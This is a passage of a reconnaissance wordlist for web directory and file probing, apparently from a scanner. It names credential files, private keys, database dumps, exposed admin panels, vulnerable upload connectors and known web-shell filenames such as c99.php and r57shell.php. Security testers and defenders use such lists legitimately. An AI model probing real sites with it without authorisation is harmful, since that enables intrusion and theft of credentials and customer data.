    "configuration.php.save",
    "configuration.php.swp",
    "configuration.php.templ",
    "configuration.php.txt",
    "configuration.php~",
    "configuration/",
    "confluence/",
    "connect.inc",
    "console/",
    "console/base/config.json",
    "console/payments/config.json",
    "content/debug.log",
    "CONTRIBUTING.md",
    "contributors.txt",
    "controlpanel.php",
    "COPYING",
    "core/docs/changelog.txt",
    "coverage.data",
    "coverage.xml",
    "cp.php",
    "cp/",
    "cpanel",
    "cpanel.php",
    "cpanel/",
    "cpanelphpmyadmin/",
    "cpbackup-exclude.conf",
    "cpbt.php",
    "cpn.php",
    "cpphpmyadmin/",
    "crash.php",
    "CREDITS",
    "crm/",
    "cron.log",
    "cron.php",
    "cron.sh",
    "cron/cron.sh",
    "crond/logs/",
    "cronlog.txt",
    "crossdomain.xml",
    "culeadora.txt",
    "custom/db.ini",
    "customers.csv",
    "customers.log",
    "customers.mdb",
    "customers.sql",
    "customers.sql.gz",
    "customers.sqlite",
    "customers.txt",
    "customers.xls",
    "CVS/",
    "CVS/Root",
    "d.php",
    "d0main.php",
    "d0maine.php",
    "d0mains.php",
    "dam.php",
    "data-nseries.tsv",
    "data.mdb",
    "data.sql",
    "data.sqlite",
    "data.tsv",
    "data.txt",
    "data/backups/",
    "data/debug/",
    "data/files/",
    "data/logs/",
    "data/tmp/",
    "dataBackup/",
    "database",
    "database.csv",
    "database.inc",
    "database.log",
    "database.mdb",
    "database.php",
    "database.sql",
    "database.sqlite",
    "database.txt",
    "database.yml",
    "database.yml.pgsql",
    "database.yml.sqlite3",
    "database.yml_original",
    "database.yml~",
    "database/",
    "database_admin",
    "Database_Backup/",
    "database_credentials.inc",
    "databases.yml",
    "dataobject.ini",
    "davmail.log",
    "DB",
    "db-admin",
    "db-full.mysql",
    "db.csv",
    "db.inc",
    "db.ini",
    "db.log",
    "db.mdb",
    "db.properties",
    "db.sql",
    "db.sqlite",
    "db/",
    "db/main.mdb",
    "db1.mdb",
    "db1.sqlite",
    "db2",
    "db_admin",
    "db_backups/",
    "dbaccess.log",
    "dbadmin.php",
    "dbadmin/",
    "dbase",
    "dbbackup/",
    "dbfix/",
    "dead.letter",
    "debug",
    "debug-output.txt",
    "debug.inc",
    "debug.log",
    "debug.php",
    "debug.txt",
    "debug/",
    "debug_error.jsp",
    "default.php",
    "delete.php",
    "demo",
    "demo.php",
    "demo/ejb/index.html",
    "demo/sql/index.jsp",
    "deploy",
    "deploy.rb",
    "Descript.ion",
    "Desktop.ini",
    "desktop/index_framed.htm",
    "dev.php",
    "dev/",
    "development-parts/",
    "development.esproj/",
    "development/",
    "df_main.sql",
    "dir.php",
    "dist/",
    "docker-compose.yaml",
    "docker-compose.yml",
    "Dockerfile",
    "doctrine/schema/eirec.yml",
    "doctrine/schema/tmx.yml",
    "documentation/config.yml",
    "dom.php",
    "download",
    "download.php",
    "download/history.csv",
    "download/users.csv",
    "downloader/cache.cfg",
    "downloader/connect.cfg",
    "downloads/dom.php",
    "dra.php",
    "dummy",
    "dummy.php",
    "dump",
    "dump.7z",
    "dump.inc",
    "dump.inc.old",
    "dump.log",
    "dump.old",
    "dump.rar",
    "dump.rdb",
    "dump.sql",
    "dump.sql.old",
    "dump.sqlite",
    "dump.tar",
    "dump.tar.bz2",
    "dump.tar.gz",
    "dump.tgz",
    "dump.zip",
    "dump/",
    "dump_file.sql",
    "dumper.php",
    "dumper/",
    "dumps/",
    "dumpuser.aspx",
    "dz.php",
    "dz0.php",
    "dz1.php",
    "ecosystem.json",
    "edit.php",
    "edit/spaw2/dialogs/dialog.php",
    "editor.php",
    "editor/FCKeditor",
    "editor/stats/",
    "editor/tiny_mce/",
    "editor/tinymce/",
    "editors/FCKeditor",
    "ehthumbs.db",
    "elfinder/elfinder.php",
    "elim/blist.xml",
    "emul.js",
    "engine/classes/swfupload/swfupload.swf",
    "engine/classes/swfupload/swfupload_f9.swf",
    "engine/libs/spaw/dialogs/dialog.php",
    "env",
    "environment.rb",
    "err",
    "error",
    "error-log",
    "error-log.txt",
    "error.html",
    "error.log",
    "error.log.0",
    "error.txt",
    "error/",
    "error_log",
    "error_log.gz",
    "error_log.txt",
    "errorlog",
    "errors.log",
    "errors.txt",
    "errors/",
    "errors/creation",
    "errors/local.xml",
    "etc/config.ini",
    "etc/database.xml",
    "etc/hosts",
    "etc/passwd",
    "eudora.ini",
    "eula.txt",
    "eula_en.txt",
    "example.php",
    "examples/",
    "exp/",
    "export",
    "export/",
    "export_log.old.txt",
    "export_log.txt",
    "export_stock_log.txt",
    "FAQ",
    "FCKeditor",
    "FCKeditor/",
    "fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp",
    "fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx",
    "fckeditor/editor/filemanager/browser/default/connectors/php/connector.php",
    "fckeditor/editor/filemanager/connectors/asp/connector.asp",
    "fckeditor/editor/filemanager/connectors/asp/upload.asp",
    "fckeditor/editor/filemanager/connectors/aspx/connector.aspx",
    "fckeditor/editor/filemanager/connectors/aspx/upload.aspx",
    "fckeditor/editor/filemanager/connectors/php/connector.php",
    "fckeditor/editor/filemanager/connectors/php/upload.php",
    "fckeditor/editor/filemanager/upload/asp/upload.asp",
    "fckeditor/editor/filemanager/upload/aspx/upload.aspx",
    "fckeditor/editor/filemanager/upload/php/upload.php",
    "FCKeditor2.0/",
    "FCKeditor2.1/",
    "FCKeditor2.2/",
    "FCKeditor2.3/",
    "FCKeditor2.4/",
    "FCKeditor2/",
    "FCKeditor20/",
    "FCKeditor21/",
    "FCKeditor22/",
    "FCKeditor23/",
    "FCKeditor24/",
    "fetch",
    "ffftp.ini",
    "file.php",
    "file.sql",
    "file_manager/",
    "file_upload.asp",
    "file_upload.aspx",
    "file_upload.cfm",
    "file_upload.htm",
    "file_upload.html",
    "file_upload.php",
    "file_upload.php3",
    "file_upload.shtm",
    "file_upload/",
    "fileadmin",
    "fileadmin.php",
    "fileadmin/",
    "filedump/",
    "filemanager",
    "filemanager/",
    "files.md5",
    "files/",
    "fileupload/",
    "flashFXP.ini",
    "forum.rar",
    "forum.sql",
    "forum.tar",
    "forum.tar.gz",
    "forum.zip",
    "forum/install/install.php",
    "forum/phpmyadmin/",
    "forums/cache/db_update.lock",
    "fpadmin",
    "ftp.txt",
    "ganglia/",
    "gaza.php",
    "Gemfile",
    "Gemfile.lock",
    "get.php",
    "git-service",
    "gitlab",
    "gitlog",
    "global",
    "global.asa.bak",
    "global.asa.old",
    "global.asa.orig",
    "global.asa.temp",
    "global.asa.tmp",
    "Global.asax",
    "global.asax.bak",
    "global.asax.old",
    "global.asax.orig",
    "global.asax.temp",
    "global.asax.tmp",
    "globals",
    "globals.inc",
    "grabbed.html",
    "gradlew",
    "graph",
    "graphiql",
    "graphql",
    "graphql-explorer",
    "graphql/console",
    "Gruntfile.js",
    "haproxy_stats",
    "haproxy_stats1",
    "haproxy_stats2",
    "haproxy_stats3",
    "HEADER.txt",
    "heapdump",
    "HISTORY",
    "HISTORY.rst",
    "home.rar",
    "home.tar",
    "home.tar.gz",
    "home.zip",
    "horizon",
    "hosts",
    "ht.access",
    "htaccess.backup",
    "htaccess.bak",
    "htaccess.dist",
    "htaccess.old",
    "htaccess.txt",
    "htgroup",
    "html/config.rb",
    "html/js/misc/swfupload/swfupload.swf",
    "html/js/misc/swfupload/swfupload_f9.swf",
    "htpasswd",
    "htpasswd.bak",
    "htpasswd/htpasswd.bak",
    "httpd.conf",
    "httpd.core",
    "httpd.ini",
    "httpd/logs/access.log",
    "httpd/logs/access_log",
    "httpd/logs/error.log",
    "httpd/logs/error_log",
    "i.php",
    "i.tar",
    "i.tar.bz2",
    "i.tar.gz",
    "i.txt",
    "i.zip",
    "id_dsa",
    "id_dsa.ppk",
    "id_rsa",
    "images/c99.php",
    "images/Sym.php",
    "import.php",
    "import/",
    "inc/config.inc",
    "inc/fckeditor/",
    "inc/tiny_mce/",
    "inc/tinymce/",
    "include/fckeditor/",
    "include/spaw2/dialogs/dialog.php",
    "includes/adovbs.inc",
    "includes/configure.php~",
    "includes/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp",
    "includes/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx",
    "includes/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php",
    "includes/fckeditor/editor/filemanager/connectors/asp/connector.asp",
    "includes/fckeditor/editor/filemanager/connectors/asp/upload.asp",
    "includes/fckeditor/editor/filemanager/connectors/aspx/connector.aspx",
    "includes/fckeditor/editor/filemanager/connectors/aspx/upload.aspx",
    "includes/fckeditor/editor/filemanager/connectors/php/connector.php",
    "includes/fckeditor/editor/filemanager/connectors/php/upload.php",
    "includes/fckeditor/editor/filemanager/upload/asp/upload.asp",
    "includes/fckeditor/editor/filemanager/upload/aspx/upload.aspx",
    "includes/fckeditor/editor/filemanager/upload/php/upload.php",
    "includes/js/tiny_mce/",
    "includes/swfupload/swfupload.swf",
    "includes/swfupload/swfupload_f9.swf",
    "includes/tiny_mce/",
    "includes/tinymce/",
    "index-bak",
    "index-test.php",
    "index.php-bak",
    "index.php.bak",
    "index.php3",
    "index.php4",
    "index.php5",
    "index.phps",
    "index.php~",
    "index.sql",
    "index.xml",
    "info.json",
    "info.php",
    "info.txt",
    "install",
    "INSTALL.html",
    "INSTALL.md",
    "INSTALL.mysql",
    "install.mysql.txt",
    "INSTALL.pgsql",
    "install.pgsql.txt",
    "install.php",
    "install.sql",
    "install.txt",
    "install/",
    "install/update.log",
    "install1/",
    "install2/",
    "install_",
    "INSTALL_admin",
    "installation.php",
    "installed.json",
    "installer",
    "installer/",
    "install~/",
    "invoker/JMXInvokerServlet",
    "ispmgr/",
    "javax.faces.resource.../WEB-INF/web.xml.jsf",
    "jdbc",
    "jenkins/script",
    "jira/",
    "jmx-console",
    "jmx-console/",
    "jo.php",
    "joomla.rar",
    "joomla.xml",
    "joomla.zip",
    "js/elfinder/elfinder.php",
    "js/FCKeditor",
    "js/swfupload/swfupload.swf",
    "js/swfupload/swfupload_f9.swf",
    "js/tiny_mce/",
    "js/tinymce/",
    "jscripts/tiny_mce/",
    "jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php",
    "jscripts/tinymce/",
    "jsp-examples/",
    "kcfinder/browse.php",
    "killer.php",
    "l0gs.txt",
    "L3b.php",
    "lander.logs",
    "last.sql",
    "lib/fckeditor/",
    "lib/fileupload/fileBrowser.php",
    "lib/flex/uploader/.actionScriptProperties",
    "lib/flex/uploader/.flexProperties",
    "lib/flex/uploader/.project",
    "lib/flex/uploader/.settings",
    "lib/flex/varien/.actionScriptProperties",
    "lib/flex/varien/.flexLibProperties",
    "lib/flex/varien/.project",
    "lib/flex/varien/.settings",
    "lib/spaw2/dialogs/dialog.php",
    "lib/tiny_mce/",
    "lib/tinymce/",
    "libraries/phpmailer/",
    "libraries/tiny_mce/",
    "libraries/tinymce/",
    "libs/spaw/dialogs/dialog.php",
    "libs/spaw2/dialogs/dialog.php",
    "LICENSE.txt",
    "lilo.conf",
    "linkhub/linkhub.log",
    "linktous.html",
    "linusadmin-phpinfo.php",
    "list_emails",
    "lists/config",
    "load.php",
    "local.config.rb",
    "local.properties",
    "local.xml.additional",
    "local.xml.template",
    "local/.git/index",
    "local/.gitignore",
    "local/composer.lock",
    "local/composer.phar",
    "local_bd_new.txt",
    "local_bd_old.txt",
    "localhost.old",
    "localhost.rar",
    "localhost.rdb",
    "localhost.sql",
    "localhost.sqlite",
    "localhost.tag.gz",
    "localhost.tar",
    "localhost.tar.bz2",
    "localhost.tar.gz",
    "localhost.tgz",
    "localhost.zipu",
    "localsettings.php.bak",
    "localsettings.php.dist",
    "localsettings.php.old",
    "localsettings.php.save",
    "localsettings.php.swp",
    "localsettings.php.templ",
    "localsettings.php.txt",
    "localsettings.php~",
    "log.htm",
    "log.html",
    "log.mdb",
    "log.php",
    "log.sqlite",
    "log.txt",
    "log/",
    "log/access.log",
    "log/access_log",
    "log/development.log",
    "log/error.log",
    "log/error_log",
    "log/log.log",
    "log/log.txt",
    "log/production.log",
    "log/server.log",
    "log/test.log",
    "log_1.txt",
    "log_errors.txt",
    "log_status_order.txt",
    "logexpcus.txt",
    "logfile",
    "logfiles",
    "login",
    "login.php",
    "login/github",
    "login/google",
    "login/twitter",
    "logins.txt",
    "logs",
    "logs.htm",
    "logs.html",
    "logs.mdb",
    "logs.sqlite",
    "logs.txt",
    "logs/",
    "logs/access.log",
    "logs/access_log",
    "logs/error.log",
    "logs/error_log",
    "logs/errors",
    "logs/sendmail",
    "logs_console/",
    "lol.php",
    "ma/",
    "madspot.php",
    "madspotshell.php",
    "magmi/conf/magmi.ini",
    "MAINTAINERS.txt",
    "maintenance.flag",
    "maintenance.flag.bak",
    "maintenance.flag2",
    "maintenance.php",
    "maintenance/",
    "maintenance/test.php",
    "maintenance/test2.php",
    "Makefile",
    "manage.py",
    "manage/heapdump",
    "manager/",
    "manager/html",
    "master.passwd",
    "master/portquotes_new/admin.log",
    "media/export-criteo.xml",
    "member",
    "memberlist",
    "members",
    "members.csv",
    "members.log",
    "members.mdb",
    "members.sql",
    "members.sql.gz",
    "members.sqlite",
    "members.txt",
    "members.xls",
    "membersonly",
    "memoria",
    "mercurial.ini",
    "META-INF/context.xml",
    "metrics",
    "moadmin.php",
    "moderator.php",
    "moderator/",
    "modules/php/php.info",
    "modules/spaw2/dialogs/dialog.php",
    "mrtg.cfg",
    "msql/",
    "mssql/",
    "mt-check.cgi",
    "muracms.esproj",
    "mw-config/",
    "myadm/",
    "MyAdmin/",
    "myadmin/index.php",
    "myadmin/scripts/setup.php",
    "mybackup/",
    "mysql-admin/",
    "mysql.err",
    "mysql.log",
    "mysql.php",
    "mysql.sql",
    "mysql/",
    "mysql/adminer.php",
    "mysql/scripts/setup.php",
    "mysql_backups/",
    "mysql_debug.sql",
    "mysqladmin/",
    "mysqladmin/scripts/setup.php",
    "mysqldumper/",
    "mysqlitedb.db",
    "mysqlmanager/",
    "nano.save",
    "nb-configuration.xml",
    "nbactions.xml",
    "nbproject/",
    "nbproject/private/private.properties",
    "nbproject/private/private.xml",
    "nbproject/project.properties",
    "nbproject/project.xml",
    "New%20Folder",
    "New%20folder%20(2)",
    "new.php",
    "nginx-access.log",
    "nginx-error.log",
    "nginx-ssl.access.log",
    "nginx-ssl.error.log",
    "nginx-status/",
    "nginx.conf",
    "nginx_status",
    "nohup.out",
    "nova",
    "nomad",
    "npm-debug.log",
    "nst.php",
    "nstview.php",
    "oauth/authorize",
    "oauth/clients",
    "oauth/personal-access-tokens",
    "oauth/scopes",
    "oauth/token",
    "odbc",
    "old",
    "old.htaccess",
    "old.htpasswd",
    "old/",
    "old_files",
    "old_site/",
    "oldfiles",
    "oracle",
    "order.log",
    "order.txt",
    "order_add_log.txt",
    "order_log",
    "orders",
    "orders.csv",
    "orders.log",
    "orders.sql",
    "orders.sql.gz",
    "orders.txt",
    "orders.xls",
    "orders_log",
    "ospfd.conf",
    "out",
    "output-build.txt",
    "p.php",
    "p/m/a/",
    "package.json",
    "painel/config/config.php.example",
    "panel.php",
    "panel/",
    "pass",
    "pass.dat",
    "pass.txt",
    "passes.txt",
    "passlist",
    "passlist.txt",
    "passwd",
    "passwd.adjunct",
    "passwd.bak",
    "passwd.txt",
    "Password",
    "password.html",
    "password.log",    
    "password.mdb",
    "password.sqlite",
    "password.txt",
    "passwords",
    "passwords.html",
    "passwords.mdb",
    "passwords.sqlite",
    "passwords.txt",
    "payment",
    "pbmadmin/",
    "personal",
    "personal.mdb",
    "personal.sqlite",
    "pgadmin",
    "pgadmin.log",
    "phinx.yml",
    "php",
    "php-backdoor.php",
    "php-cgi.core",
    "php-cli.ini",
    "php-cs-fixer.phar",
    "php-error",
    "php-errors.log",
    "php-info.php",
    "php-my-admin/",
    "php-myadmin/",
    "php.core",
    "php.ini",
    "php.ini-orig.txt",
    "php.ini.sample",
    "php.ini_",
    "php.ini~",
    "php.lnk",
    "php.log",
    "php.php",
    "php/phpmyadmin/",
    "php4.ini",
    "php5.fcgi",
    "php5.ini",
    "php_cli_errors.log",
    "php_error.log",
    "php_error_log",
    "php_errorlog",
    "php_errors.log",
    "php_info.php",
    "phpadmin/",
    "phpadminmy/",
    "phperrors.log",
    "phpin.php",
    "phpinfo",
    "phpinfo.php",
    "phpinfo.php3",
    "phpinfo.php4",
    "phpinfo.php5",
    "phpini.bak",
    "phpldapadmin",
    "phpldapadmin/",
    "phpliteadmin.php",
    "phpma/",
    "phpmanager/",
    "phpmem/",
    "phpmemcachedadmin/",
    "phpmy-admin/",
    "phpMy/",
    "phpmyad/",
    "phpMyAdmin-2.10.0.0/",
    "phpMyAdmin-2.10.0.1/",
    "phpMyAdmin-2.10.0.2/",
    "phpMyAdmin-2.10.0/",
    "phpMyAdmin-2.10.1.0/",
    "phpMyAdmin-2.10.2.0/",
    "phpMyAdmin-2.11.0.0/",
    "phpMyAdmin-2.11.1-all-languages/",
    "phpMyAdmin-2.11.1.0/",
    "phpMyAdmin-2.11.1.1/",
    "phpMyAdmin-2.11.1.2/",
    "phpMyAdmin-2.2.3/",
    "phpMyAdmin-2.2.6/",
    "phpMyAdmin-2.5.1/",
    "phpMyAdmin-2.5.4/",
    "phpMyAdmin-2.5.5-pl1/",
    "phpMyAdmin-2.5.5-rc1/",
    "phpMyAdmin-2.5.5-rc2/",
    "phpMyAdmin-2.5.5/",
    "phpMyAdmin-2.5.6-rc1/",
    "phpMyAdmin-2.5.6-rc2/",
    "phpMyAdmin-2.5.6/",
    "phpMyAdmin-2.5.7-pl1/",
    "phpMyAdmin-2.5.7/",
    "phpMyAdmin-2.6.0-alpha/",
    "phpMyAdmin-2.6.0-alpha2/",
    "phpMyAdmin-2.6.0-beta1/",
    "phpMyAdmin-2.6.0-beta2/",
    "phpMyAdmin-2.6.0-pl1/",
    "phpMyAdmin-2.6.0-pl2/",
    "phpMyAdmin-2.6.0-pl3/",
    "phpMyAdmin-2.6.0-rc1/",
    "phpMyAdmin-2.6.0-rc2/",
    "phpMyAdmin-2.6.0-rc3/",
    "phpMyAdmin-2.6.0/",
    "phpMyAdmin-2.6.1-pl1/",
    "phpMyAdmin-2.6.1-pl2/",
    "phpMyAdmin-2.6.1-pl3/",
    "phpMyAdmin-2.6.1-rc1/",
    "phpMyAdmin-2.6.1-rc2/",
    "phpMyAdmin-2.6.1/",
    "phpMyAdmin-2.6.2-beta1/",
    "phpMyAdmin-2.6.2-pl1/",
    "phpMyAdmin-2.6.2-rc1/",
    "phpMyAdmin-2.6.2/",
    "phpMyAdmin-2.6.3-pl1/",
    "phpMyAdmin-2.6.3-rc1/",
    "phpMyAdmin-2.6.3/",
    "phpMyAdmin-2.6.4-pl1/",
    "phpMyAdmin-2.6.4-pl2/",
    "phpMyAdmin-2.6.4-pl3/",
    "phpMyAdmin-2.6.4-pl4/",
    "phpMyAdmin-2.6.4-rc1/",
    "phpMyAdmin-2.6.4/",
    "phpMyAdmin-2.6.5/",
    "phpMyAdmin-2.6.6/",
    "phpMyAdmin-2.6.9/",
    "phpMyAdmin-2.7.0-beta1/",
    "phpMyAdmin-2.7.0-pl1/",
    "phpMyAdmin-2.7.0-pl2/",
    "phpMyAdmin-2.7.0-rc1/",
    "phpMyAdmin-2.7.0/",
    "phpMyAdmin-2.7.5/",
    "phpMyAdmin-2.7.6/",
    "phpMyAdmin-2.7.7/",
    "phpMyAdmin-2.8.0-beta1/",
    "phpMyAdmin-2.8.0-rc1/",
    "phpMyAdmin-2.8.0-rc2/",
    "phpMyAdmin-2.8.0.1/",
    "phpMyAdmin-2.8.0.2/",
    "phpMyAdmin-2.8.0.3/",
    "phpMyAdmin-2.8.0.4/",
    "phpMyAdmin-2.8.0/",
    "phpMyAdmin-2.8.1-rc1/",
    "phpMyAdmin-2.8.1/",
    "phpMyAdmin-2.8.2.3/",
    "phpMyAdmin-2.8.2/",
    "phpMyAdmin-2.8.3/",
    "phpMyAdmin-2.8.4/",
    "phpMyAdmin-2.8.5/",
    "phpMyAdmin-2.8.6/",
    "phpMyAdmin-2.8.7/",
    "phpMyAdmin-2.8.8/",
    "phpMyAdmin-2.8.9/",
    "phpMyAdmin-2.9.0-rc1/",
    "phpMyAdmin-2.9.0.1/",
    "phpMyAdmin-2.9.0.2/",
    "phpMyAdmin-2.9.0/",
    "phpMyAdmin-2.9.1/",
    "phpMyAdmin-2.9.2/",
    "phpMyAdmin-2/",
    "phpMyAdmin-3.0.0-rc1-english/",
    "phpMyAdmin-3.0.0.0-all-languages/",
    "phpMyAdmin-3.0.1.0-english/",
    "phpMyAdmin-3.0.1.0/",
    "phpMyAdmin-3.0.1.1/",
    "phpMyAdmin-3.1.0.0-english/",
    "phpMyAdmin-3.1.0.0/",
    "phpMyAdmin-3.1.1.0-all-languages/",
    "phpMyAdmin-3.1.2.0-all-languages/",
    "phpMyAdmin-3.1.2.0-english/",
    "phpMyAdmin-3.1.2.0/",
    "phpMyAdmin-3.4.3.1/",
    "phpMyAdmin-4.0.10.10-all-languages/",
    "phpMyAdmin-4.0.10.10-english/",
    "phpMyAdmin-4.3.13.3-all-languages/",
    "phpMyAdmin-4.3.13.3-english/",
    "phpMyAdmin-4.4.14.1-all-languages/",
    "phpMyAdmin-4.4.14.1-english/",
    "phpMyAdmin-4.5.0-rc1-all-languages/",
    "phpMyAdmin-4.5.0-rc1-english/",
    "phpmyadmin.backup/",
    "phpMyAdmin/",
    "phpMyAdmin/scripts/setup.php",
    "phpMyAdmin0/",
    "phpMyAdmin1/",
    "phpmyadmin2/",
    "phpmyadmin3/",
    "phpMyAdmin4/",
    "phpMyAdminBackup/",
    "phpPgAdmin/",
    "phpRedisAdmin/",
    "phpredmin/",
    "phpsecinfo/",
    "phpsysinfo/",
    "phpThumb.php",
    "phpThumb/",
    "phpunit.phar",
    "phpunit.xml",
    "phpunit.xml.dist",
    "phymyadmin/",
    "pi.php",
    "pi.php5",
    "pinfo.php",
    "pip-log.txt",
    "plugins.log",
    "plugins/editors/fckeditor",
    "plugins/fckeditor",
    "plugins/sfSWFUploadPlugin/web/sfSWFUploadPlugin/swf/swfupload.swf",
    "plugins/sfSWFUploadPlugin/web/sfSWFUploadPlugin/swf/swfupload_f9.swf",
    "plugins/spaw2/dialogs/dialog.php",
    "plugins/tiny_mce/",
    "plugins/tinymce/",
    "plugins/upload.php",
    "plugins/web.config",
    "plupload",
    "pma/",
    "pma/index.php",
    "pma/scripts/setup.php",
    "PMA2005/",
    "pma4/",
    "pmadmin/",
    "pmyadmin/",
    "pom.xml",
    "prefetch.txt",
    "priv8.php",
    "private.key",
    "private.mdb",
    "private.sqlite",
    "proftpdpasswd",
    "project.pbxproj",
    "project.xml",
    "propel.ini",
    "proxy",
    "prv/",
    "public/spaw2/dialogs/dialog.php",
    "publication_list.xml",
    "pw.txt",
    "pwd.db",
    "pws.txt",
    "qa/",
    "query.log",
    "r.php",
    "r00t.php",
    "r57.php",
    "r57eng.php",
    "r57shell.php",
    "r58.php",
    "r99.php",
    "redis",
    "Read",
    "Read%20Me.txt",
    "read.me",
    "read_file",
    "Read_Me.txt",
    "readfile",
    "README",
    "README.htm",
    "readme.html",
    "README.md",
    "README.txt",
    "recentservers.xml",
    "redirect",
    "register.php",
    "RELEASE_NOTES.txt",
    "remote.php/webdav/",
    "request.log",
    "reseller",
    "resources.xml",
    "resources/fckeditor",
    "restore.php",
    "restricted",
    "revision.inc",
    "revision.txt",
    "RootCA.crt",
    "rst.php",
    "sa.php",
    "sa2.php",
    "sales.csv",
    "sales.log",
    "sales.sql",
    "sales.sql.gz",
    "sales.txt",
    "sales.xls",
    "sample.txt",
    "sample.txt~",
    "schema.sql",
    "schema.yml",
    "scout",
    "scripts/ckeditor/ckfinder/core/connector/asp/connector.asp",
    "scripts/ckeditor/ckfinder/core/connector/aspx/connector.aspx",
    "scripts/ckeditor/ckfinder/core/connector/php/connector.php",
    "scripts/setup.php",
    "search",
    "searchreplacedb2.php",
    "searchreplacedb2cli.php",
    "Secret/",
    "secrets/",
    "secring.bak",
    "secring.pgp",
    "secring.skr",
    "secure/attachmentzip/",
    "secure/ConfigureReport.jspa",
    "sentemails.log",
    "serv-u.ini",
    "server-info",
    "server-status/",
    "server.cfg",
    "server.log",
    "Server.php",
    "server.xml",
    "Server/",
    "servers/",
    "service.asmx",
    "services",
    "servlet/Oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml",
    "servlet/Oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml",
    "session/",
    "sessions/",
    "settings.bak",
    "settings.dist",
    "settings.ini",
    "settings.old",
    "settings.php",
    "settings.php.bak",
    "settings.php.dist",
    "settings.php.old",
    "settings.php.save",
    "settings.php.swp",
    "settings.php.templ",
    "settings.php.txt",
    "settings.php1",
    "settings.php2",
    "settings.php~",
    "settings.py",
    "settings.save",
    "settings.swp",
    "settings.txt",
    "settings.xml",
    "settings/",
    "setup.php",
    "setup.sql",
    "setup/",
    "sftp-config.json",
    "Sh3ll.php",
    "shell.php",
    "shell/",
    "shellz.php",
    "shop.sql",
    "signin.php?ret=",
    "signup.action",
    "simple-backdoor.php",
    "site.rar",
    "site.sql",
    "site.tar.gz",
    "site.txt",
    "site/common.xml",
    "site_admin",
    "siteadmin",
    "sites.ini",
    "slapd.conf",
    "soap/",
    "soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml",
    "soapserver/",
    "sonar-project.properties",
    "source.php",
    "spaw/dialogs/dialog.php",
    "spaw2/dialogs/dialog.php",
    "spec/lib/database.yml",
    "spec/lib/settings.local.yml",
    "spwd.db",
    "spy.aspx",
    "sql.inc",
    "sql.php",
    "sql.sql",
    "sql.tar",
    "sql.tgz",
    "sql.txt",
    "sql.zip",
    "sql/",
    "sql/db.sql",
    "sql/index.php",
    "sql_dumps",
    "sql_error.log",
    "sqladm",
    "sqladmin",
    "sqlbuddy",
    "sqlbuddy/login.php",
    "sqlmanager/",
    "sqlmigrate.php",
    "sqlnet.log",
    "sqlweb/",
    "ss_database_backup.sql",
    "stat/",
    "statistics/",
    "stats",
    "stats/",
    "status.php",
    "STATUS.txt",
    "status.xsl",
    "status/",
    "status2",
    "statusicon/",
    "stronghold-info",
    "stronghold-status",
    "stripe",
    "stripe/webhook",
    "stub-status",
    "sugarcrm.log",
    "surgemail/",
    "surgemail/mtemp/surgeweb/tpl/shared/modules/swfupload.swf",
    "surgemail/mtemp/surgeweb/tpl/shared/modules/swfupload_f9.swf",
    "svn.revision",
    "SVN/",
    "swagger-ui",
    "swfupload",
    "sxd/",
    "sxd/backup/",
    "sYm.php",
    "sym/root/home/",
    "symfony/apps/frontend/config/routing.yml",
    "symfony/apps/frontend/config/settings.yml",
    "symfony/config/databases.yml",
    "Symlink.php",
    "Symlink.pl",
    "symphony/apps/frontend/config/app.yml",
    "symphony/apps/frontend/config/databases.yml",
    "symphony/config/app.yml",
    "symphony/config/databases.yml",
    "sysadmin",
    "sysadmin.php",
    "sysadmins",
    "sysadmins/",
    "sysbackup",
    "syslog/",
    "system.log",
    "system/cron/cron.txt",
    "system/error.txt",
    "system/log/",
    "system/logs/",
    "t00.php",
    "tar",
    "tar.bz2",
    "tar.gz",
    "technico.txt",
    "telescope",
    "telphin.log",
    "temp.php",
    "TEMP/",
    "template/",
    "templates/",
    "templates/beez/index.php",
    "templates/ja-helio-farsi/index.php",
    "templates/rhuk_milkyway/index.php",
    "test",
    "test.asp",
    "test.aspx",
    "test.chm",
    "test.htm",
    "test.html",
    "test.jsp",
    "test.mdb",
    "test.php",
    "test.sqlite",
    "test.txt",
    "test/",
    "test0.php",
    "test1.php",
    "test123.php",
    "test2.php",
    "test3.php",
    "test4.php",
    "test5.php",
    "test6.php",
    "test7.php",
    "test8.php",
    "test9.php",
    "test_",
    "test_ip.php",
    "testing",
    "tests",
    "tests/phpunit_report.xml",
    "Thumbs.db",
    "tiny_mce/",
    "tiny_mce/plugins/filemanager/examples.html",
    "tiny_mce/plugins/imagemanager/pages/im/index.html",
    "tinymce/",
    "TMP",
    "tmp/",
    "tmp/2.php",
    "tmp/access.log",
    "tmp/access_log",
    "tmp/admin.php",
    "tmp/cgi.pl",
    "tmp/Cgishell.pl",
    "tmp/changeall.php",
    "tmp/cpn.php",
    "tmp/d.php",
    "tmp/d0maine.php",
    "tmp/domaine.php",
    "tmp/domaine.pl",
    "tmp/dz.php",
    "tmp/dz1.php",
    "tmp/error.log",
    "tmp/error_log",
    "tmp/index.php",
    "tmp/killer.php",
    "tmp/L3b.php",
    "tmp/madspotshell.php",
    "tmp/priv8.php",
    "tmp/root.php",
    "tmp/sessions/",
    "tmp/sql.php",
    "tmp/Sym.php",
    "tmp/up.php",
    "tmp/upload.php",
    "tmp/uploads.php",
    "tmp/user.php",
    "tmp/vaga.php",
    "tmp/whmcs.php",
    "tmp/xd.php",
    "TODO",
    "tools",
    "tools/_backups/",
    "Trace.axd",
    "Trace.axd::$DATA",
    "tst",
    "typo3/phpmyadmin/",
    "typo3/phpmyadmin/scripts/setup.php",
    "uber/phpMemcachedAdmin/",
    "uber/phpMyAdmin/",
    "uber/phpMyAdminBackup/",
    "ui/vault/",
    "unattend.txt",
    "up.php",
    "UPDATE.txt",
    "updates",
    "UPGRADE",
    "upgrade.php",
    "UPGRADE.txt",
    "upl.php",
    "Upload",
    "upload.asp",
    "upload.aspx",
    "upload.cfm",
    "upload.htm",
    "upload.html",
    "upload.php",
    "upload.php3",
    "upload.shtm",
    "upload/",
    "upload/1.php",
    "upload/b_user.csv",
    "upload/b_user.xls",
    "upload/test.php",
    "upload/test.txt",
    "upload/upload.php",
    "upload2.php",
    "upload_file.php",
    "uploadarticles/uploadTester.asp",
    "uploader.php",
